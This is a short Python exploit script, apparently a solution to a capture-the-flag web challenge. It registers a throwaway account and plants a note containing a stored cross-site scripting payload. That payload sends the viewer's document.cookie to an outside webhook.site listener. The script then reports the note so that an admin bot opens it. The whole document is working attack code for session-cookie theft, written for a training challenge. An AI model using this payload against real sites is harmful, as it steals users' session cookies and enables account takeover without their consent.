import requests
import string
import random
import re

def random_string():
    return ''.join(random.choices(string.ascii_letters, k=10))

url = "http://debug_disabilitato.challs.olicyber.it"
username = random_string()
password = random_string()
xss_listener = "https://webhook.site/ed4a584e-0339-44f6-826b-663bd409e751/"

s = requests.Session()
r = s.post(f"{url}/register", data={
    "username": username,
    "password": password
})

r = s.post(f"{url}/add_note", data={
    "title": "Exploit",
    "content": f'<p id="debug"></p> <script>location.href = "{xss_listener}?" + document.cookie;</script>'
})

matches = re.findall(r'<a href="get_note/(\d+)"', r.text)
report_id = matches[0]

r = s.post(f"{url}/report", data={
    "report_id": report_id
})
